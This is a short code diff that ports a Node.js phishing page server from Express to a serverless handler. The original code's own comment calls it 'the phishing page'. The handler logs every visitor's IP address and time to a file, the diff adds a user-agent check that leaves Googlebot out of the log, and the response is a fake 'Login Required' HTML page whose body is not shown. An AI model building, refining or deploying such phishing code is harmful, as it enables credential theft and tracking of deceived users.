@@ -1,14 +1,15 @@
-const express = require('express');
 const fs = require('fs');
-const app = express();
-const PORT = 3000;
 
-// Serve the phishing page
-app.get('/', (req, res) => {
-    // Log who accessed
+export default function handler(req, res) {
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    fs.appendFileSync('log.txt', `Opened by IP: ${ip} at ${new Date().toISOString()}\n`);
-    
+    const userAgent = req.headers['user-agent'] || '';
+
+    // Log only real users
+    if (!userAgent.includes('Googlebot')) {
+        fs.appendFileSync('log.txt', `Opened by IP: ${ip} at ${new Date().toISOString()}\n`);
+    }
+
+    res.setHeader('Content-Type', 'text/html');
     res.send(`
       <html>
       <head><title>Login Required</title></head>
@@ -22,9 +23,4 @@ app.get('/', (req, res) => {
       </body>
       </html>
     `);
-});
-
-// Start server
-app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
-});
+}
